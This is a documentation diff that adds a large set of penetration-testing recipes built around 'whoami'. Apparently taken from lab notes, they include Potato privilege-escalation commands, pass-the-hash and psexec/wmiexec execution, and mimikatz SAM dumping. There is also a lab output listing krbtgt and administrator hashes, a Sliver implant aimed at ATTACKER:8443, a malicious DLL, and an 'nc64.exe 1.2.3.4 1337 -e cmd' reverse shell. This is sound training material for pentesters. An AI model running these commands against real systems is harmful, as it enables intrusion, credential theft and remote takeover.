@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=whoami) · [All tools](/index)
+
 ## Commands
 
 **Windows cmd.exe or PowerShell**
@@ -23,8 +25,900 @@ whoami /groups
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=whoami)
+## Notebook recipes
 
-## Learning and original examples
+49 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Enumerate Active Directory with Built-in Tools](/active-directory/living-off-the-land)
+<AccordionGroup>
+
+<Accordion title="Windows — inspect the current session">
+
+### Windows — inspect the current session
+
+**AD groups and effective access**
+
+```cmd
+whoami /groups
+whoami /priv
+net user USER /domain
+```
+
+</Accordion>
+
+<Accordion title="8. Windows privesc">
+
+### 8. Windows privesc
+
+**Active Directory Attack Path: Worked Lab**
+
+```cmd
+whoami /priv      :: privileges -> SeImpersonate/SeDebug/SeBackup = escalation paths
+whoami /groups    :: BUILTIN\Administrators? privileged AD groups?
+whoami /all       :: full token (SID, integrity level)
+```
+
+</Accordion>
+
+<Accordion title="B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move">
+
+### B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move
+
+**Active Directory Attack Path: Worked Lab**
+
+```cmd
+.\PrintSpoofer64.exe -i -c cmd.exe
+:: or, very reliable on Server 2019:
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
+```
+
+</Accordion>
+
+<Accordion title="Windows Local Groups">
+
+### Windows Local Groups
+
+**Active Directory Enumeration Commands**
+
+```powershell
+net localgroup
+    # List local groups on a Windows machine
+
+net localgroup Administrators
+    # Show members of the local Administrators group
+
+net localgroup "Remote Management Users"
+    # Show users allowed to use WinRM
+
+net localgroup "Backup Operators"
+    # Show members of Backup Operators
+
+net localgroup "Server Operators"
+    # Show members of Server Operators
+
+whoami /groups
+    # Show groups belonging to the current Windows account
+
+whoami /priv
+    # Show privileges assigned to the current Windows account
+```
+
+</Accordion>
+
+<Accordion title="Getting a SYSTEM shell using Impacket&#x27;s psexec.py">
+
+### Getting a SYSTEM shell using Impacket's psexec.py
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.5.5.....
+[*] Found writable share ADMIN$
+[*] Uploading file nkYjGWDZ.exe
+[*] Opening SVCManager on 172.16.5.5.....
+[*] Creating service eTCU on 172.16.5.5.....
+[*] Starting service eTCU.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+ACADEMY-EA-DC01
+```
+
+</Accordion>
+
+<Accordion title="Performing the Attack with raiseChild.py">
+
+### Performing the Attack with raiseChild.py
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
+[*] Forest FQDN is: INLANEFREIGHT.LOCAL
+[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
+[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
+[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+[*] Getting credentials for INLANEFREIGHT.LOCAL
+INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
+[*] Target User account name is administrator
+INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Found writable share ADMIN$
+[*] Uploading file BnEGssCE.exe
+[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Starting service UVNb.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>exit
+[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
+[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Stopping service UVNb.....
+[*] Removing service UVNb.....
+[*] Removing file BnEGssCE.exe.....
+```
+
+</Accordion>
+
+<Accordion title="CrackMapExec">
+
+### CrackMapExec
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
+SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
+SMB         10.10.110.17 445    WIN7BOX  nt authority\system
+```
+
+</Accordion>
+
+<Accordion title="Execute Commands">
+
+### Execute Commands
+
+**Common Services: Full Module Reference**
+
+```cmd
+1> xp_cmdshell 'whoami'
+2> GO
+
+output
+-----------------------------
+no service\mssql$sqlexpress
+NULL
+(2 rows affected)
+```
+
+</Accordion>
+
+<Accordion title="Forced Authentication Attacks">
+
+### Forced Authentication Attacks
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ nc -lvnp 9001
+
+listening on [any] 9001 ...
+connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471
+
+PS C:\Windows\system32> whoami;hostname
+
+nt authority\system
+WIN11BOX
+```
+
+</Accordion>
+
+<Accordion title="Impacket PsExec">
+
+### Impacket PsExec
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.110.17.....
+[*] Found writable share ADMIN$
+[*] Uploading file EHtJXgng.exe
+[*] Opening SVCManager on 10.10.110.17.....
+[*] Creating service nbAc on 10.10.110.17.....
+[*] Starting service nbAc.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19041.1415]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami && hostname
+
+nt authority\system
+WIN7BOX
+```
+
+</Accordion>
+
+<Accordion title="Phase 6 — Post-Exploitation: Confirming Privilege Level">
+
+### Phase 6 — Post-Exploitation: Confirming Privilege Level
+
+**Common Services: Personal Assessment Notes**
+
+```text
+whoami
+```
+
+</Accordion>
+
+<Accordion title="Accessing DC03 Using Enter-PSSession">
+
+### Accessing DC03 Using Enter-PSSession
+
+**Cross-Forest Trusts - Windows**
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+inlanefreight\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
+   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
+```
+
+</Accordion>
+
+<Accordion title="Tools for this service">
+
+### Tools for this service
+
+**Evil-WinRM — Connect to Windows**
+
+```powershell
+whoami
+hostname
+```
+
+</Accordion>
+
+<Accordion title="MSSQL">
+
+### MSSQL
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Connect remotely (Impacket)
+mssqlclient.py <user>:'<pass>'@<IP>
+mssqlclient.py <user>:'<pass>'@<IP> -port <port>
+
+# Connect locally on Windows (sqlcmd)
+sqlcmd -S <server> -U sa -P "<pass>"
+sqlcmd -S <server> -E                  # Windows auth (no password)
+
+# Useful queries
+SELECT name FROM sys.databases;
+GO
+USE <database>;
+GO
+SELECT * FROM INFORMATION_SCHEMA.TABLES;
+GO
+SELECT * FROM <table>;
+GO
+
+# Enable OS command execution (as sa)
+enable_xp_cmdshell
+xp_cmdshell whoami
+xp_cmdshell dir C:\Users
+```
+
+</Accordion>
+
+<Accordion title="First look at privilege escalation">
+
+### First look at privilege escalation
+
+**Getting Started with Penetration Testing**
+
+```bash
+# Linux
+sudo -l                       # what can I run as root?
+id; whoami
+find / -perm -4000 2>/dev/null   # SUID binaries
+uname -a                      # kernel version (kernel exploits)
+
+# Windows
+whoami /priv                  # dangerous privileges?
+systeminfo                    # patch level / OS
+```
+
+</Accordion>
+
+<Accordion title="Enumeration (post-foothold)">
+
+### Enumeration (post-foothold)
+
+**HTB Box Note Template**
+
+```bash
+# linpeas / winpeas / pspy / whoami /all etc.
+```
+
+</Accordion>
+
+<Accordion title="Writable files">
+
+### Writable files
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -perm -2 -type f 2>/dev/null
+find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
+```
+
+</Accordion>
+
+<Accordion title="From DB access to OS command execution">
+
+### From DB access to OS command execution
+
+**Microsoft SQL Server Enumeration**
+
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
+
+**Microsoft SQL Server Enumeration**
+
+Context from the notebook: (Impacket exposes shortcuts:  enable_xp_cmdshell  then  xp_cmdshell whoami .)
+
+```text
+xp_cmdshell whoami
+```
+
+</Accordion>
+
+<Accordion title="NetExec: Authentication and Enumeration">
+
+### NetExec: Authentication and Enumeration
+
+**NetExec: Authentication and Enumeration**
+
+```bash
+# spray / validate creds across a subnet
+nxc smb 172.16.5.0/24 -u USER -p PASS
+nxc smb $IP -u USER -H <nthash>                 # pass-the-hash
+# enumeration
+nxc smb $IP -u USER -p PASS --shares --users --groups --pass-pol --rid-brute
+nxc ldap $DC -u USER -p PASS --bloodhound -c all --dns-server $DC
+# dumping (needs local admin)
+nxc smb $IP -u admin -p PASS --sam --lsa --ntds
+# code exec
+nxc smb $IP -u admin -p PASS -x 'whoami'        # or -X for powershell
+```
+
+</Accordion>
+
+<Accordion title="Step 3 — Use the ticket (lateral movement)">
+
+### Step 3 — Use the ticket (lateral movement)
+
+**Pass the Ticket from Windows**
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+mimikatz # exit
+
+c:\tools> powershell
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+```
+
+</Accordion>
+
+<Accordion title="Quick-start command cheat (run first, always)">
+
+### Quick-start command cheat (run first, always)
+
+**Privilege Escalation: Choose a Checklist**
+
+```powershell
+# 1. Automated
+iwr -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "C:\temp\winPEAS.exe"
+C:\temp\winPEAS.exe
+
+# 2. Manual "big 5"
+whoami /priv
+whoami /groups
+systeminfo
+net user; net localgroup administrators
+Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
+```
+
+</Accordion>
+
+<Accordion title="Enumerating our Rights on the System using xp_cmdshell">
+
+### Enumerating our Rights on the System using xp_cmdshell
+
+**Privileged Remote Access**
+
+```shellsession
+xp_cmdshell whoami /priv
+output
+
+--------------------------------------------------------------------------------
+
+NULL
+
+PRIVILEGES INFORMATION
+
+----------------------
+
+NULL
+
+Privilege Name                Description                               State
+
+============================= ========================================= ========
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+NULL
+```
+
+</Accordion>
+
+<Accordion title="Sliver: Session and Pivoting Quick Reference">
+
+### Sliver: Session and Pivoting Quick Reference
+
+**Sliver: Session and Pivoting Quick Reference**
+
+```bash
+# server
+sliver-server
+# generate an implant
+sliver > generate --mtls ATTACKER:8443 --os windows --arch amd64 --save ./imp.exe
+sliver > mtls -l 8443            # start the listener
+# after execution on target
+sliver > sessions
+sliver > use <id>
+sliver (SESSION) > whoami ; ls ; getprivs
+sliver (SESSION) > socks5 start       # pivot; or: pivots / portfwd
+```
+
+</Accordion>
+
+<Accordion title="A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)">
+
+### A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: PrintSpoofer (uses the print spooler / RPC)
+.\PrintSpoofer64.exe -i -c cmd.exe
+:: GodPotato (DCOM; very reliable on Server 2016–2022) — pick the .NET version present
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"           :: -> nt authority\system
+:: alternatives if those are blocked:
+.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
+.\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
+.\EfsPotato.exe "cmd /c whoami"
+```
+
+</Accordion>
+
+<Accordion title="Who am I / what can I do">
+
+### Who am I / what can I do
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+whoami                       :: domain\user
+whoami /priv                 :: PRIVILEGES — the privesc decider
+whoami /groups               :: group memberships + integrity level
+whoami /all                  :: everything: SID, groups, privileges, integrity
+echo %USERDOMAIN% %COMPUTERNAME%
+```
+
+</Accordion>
+
+<Accordion title="EoP - Incorrect permissions in services">
+
+### EoP - Incorrect permissions in services
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+# find missing DLL 
+- Find-PathDLLHijack PowerUp.ps1
+- Process Monitor : check for "Name Not Found"
+
+# compile a malicious dll
+- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+
+# content of windows_dll.c
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
+
+</Accordion>
+
+<Accordion title="EoP - Runas">
+
+### EoP - Runas
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+runas /savecred /user:Administrator "cmd.exe /k whoami"
+```
+
+</Accordion>
+
+<Accordion title="EoP - Windows Subsystem for Linux (WSL)">
+
+### EoP - Windows Subsystem for Linux (WSL)
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+wsl whoami
+./ubuntun1604.exe config --default-user root
+wsl whoami
+wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
+```
+
+</Accordion>
+
+<Accordion title="HiveNightmare">
+
+### HiveNightmare
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+mimikatz> token::whoami /full
+
+# List shadow copies available
+mimikatz> misc::shadowcopies
+
+# Extract account from SAM databases
+mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+
+# Extract secrets from SECURITY
+mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
+```
+
+</Accordion>
+
+<Accordion title="JuicyPotatoNG">
+
+### JuicyPotatoNG
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
+```
+
+</Accordion>
+
+<Accordion title="MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012">
+
+### MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+printf("[#] usage: ms15-051 command \n");
+printf("[#] eg: ms15-051 \"whoami /all\" \n");
+
+# x32
+https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe
+
+# x64
+https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe
+
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
+use exploit/windows/local/ms15_051_client_copy_image
+```
+
+</Accordion>
+
+<Accordion title="Restore A Service Account&#x27;s Privileges">
+
+### Restore A Service Account's Privileges
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+# https://github.com/itm4n/FullPowers
+
+c:\TOOLS>FullPowers
+[+] Started dummy thread with id 9976
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.19041.84]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+
+</Accordion>
+
+<Accordion title="User Enumeration">
+
+### User Enumeration
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+echo %USERNAME% || whoami
+$env:username
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+whoami /priv
+whoami /groups
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net user
+whoami /all
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+```
+
+</Accordion>
+
+<Accordion title="Footprinting &amp; connecting">
+
+### Footprinting & connecting
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```powershell
+# From Windows
+Test-WsMan <host>                                  # is WinRM reachable?
+Enter-PSSession -ComputerName <IP> -Credential <domain\user>
+Invoke-Command -ComputerName <IP> -Credential <user> -ScriptBlock { whoami }
+```
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```cmd
+winrs -r:<IP> -u:<user> -p:<pass> "cmd /c whoami"   # one-shot command
+```
+
+</Accordion>
+
+<Accordion title="Footprinting &amp; execution">
+
+### Footprinting & execution
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```bash
+nmap -sV -sC <IP> -p135
+
+# Impacket wmiexec — command exec / semi-interactive shell
+wmiexec.py <user>:"<pass>"@<IP> "whoami"
+wmiexec.py <user>:"<pass>"@<IP>                 # interactive
+wmiexec.py -hashes :<NTLM_hash> <user>@<IP>     # pass-the-hash
+```
+
+**Windows Remote Access: RDP, WinRM, and WMI**
+
+```powershell
+# From Windows
+Get-WmiObject -Class Win32_OperatingSystem -ComputerName <IP> -Credential <user>
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\out.txt" -ComputerName <IP>
+```
+
+</Accordion>
+
+<Accordion title="NetExec command execution">
+
+### NetExec command execution
+
+**Windows remote execution by service**
+
+```bash
+# One target and one known credential; replace PASSWORD
+nxc smb 192.0.2.10 -d example.local -u administrator -p 'PASSWORD' -x 'whoami'
+```
+
+</Accordion>
+
+<Accordion title="atexec.py">
+
+### atexec.py
+
+**Windows remote execution by service**
+
+```bash
+impacket-atexec 'example.local/administrator@192.0.2.10' 'whoami'
+```
+
+</Accordion>
+
+<Accordion title="dcomexec.py">
+
+### dcomexec.py
+
+**Windows remote execution by service**
+
+```bash
+impacket-dcomexec 'example.local/administrator@192.0.2.10' 'whoami'
+```
+
+</Accordion>
+
+<Accordion title="wmiexec.py">
+
+### wmiexec.py
+
+**Windows remote execution by service**
+
+```bash
+# Password prompt, then a semi-interactive command interface
+impacket-wmiexec 'example.local/administrator@192.0.2.10'
+
+# Single command, using an NT hash
+impacket-wmiexec -hashes ':NT_HASH' 'example.local/administrator@192.0.2.10' 'whoami'
+```
+
+</Accordion>
+
+<Accordion title="⏱️ HOW TO USE THIS — decision header (&quot;if you have X, do Y&quot;)">
+
+### ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Golden rule of order on any new host:   enumerate before you exploit.  On Windows the first three commands are always  whoami /priv ,  whoami /groups ,  whoami /all  — they decide your entire privesc path (see  8 ).
+
+```text
+whoami /priv
+```
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Golden rule of order on any new host:   enumerate before you exploit.  On Windows the first three commands are always  whoami /priv ,  whoami /groups ,  whoami /all  — they decide your entire privesc path (see  8 ).
+
+```text
+whoami /groups
+```
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Golden rule of order on any new host:   enumerate before you exploit.  On Windows the first three commands are always  whoami /priv ,  whoami /groups ,  whoami /all  — they decide your entire privesc path (see  8 ).
+
+```text
+whoami /all
+```
+
+</Accordion>
+
+<Accordion title="🧠 Methodology distilled (memorize this loop)">
+
+### 🧠 Methodology distilled (memorize this loop)
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Foothold  → 2.  Enumerate the host  (Linux: history/configs/sudo/keytabs · Windows:  whoami /priv|/groups ) → 3.  Pivot  if internal → 4.  Enumerate AD  (nxc users/shares/policy + BloodHound) → 5.  Loot & crack  (shares, vaults) → 6.  Escalate  (SeImpersonate→SYSTEM, dump LSASS) → 7.  Find the privileged credential  (BloodHound path member / DA in LSASS) → 8.  DCSync  → 9.  Persist  (krbtgt = Golden Ticket).
+
+```text
+whoami /priv|/groups
+```
+
+</Accordion>
+
+<Accordion title="Getting the SYSTEM Shell">
+
+### Getting the SYSTEM Shell
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+[*] Sending stage (200262 bytes) to 172.16.5.5
+[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400
+
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 5912 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+</Accordion>
+
+</AccordionGroup>
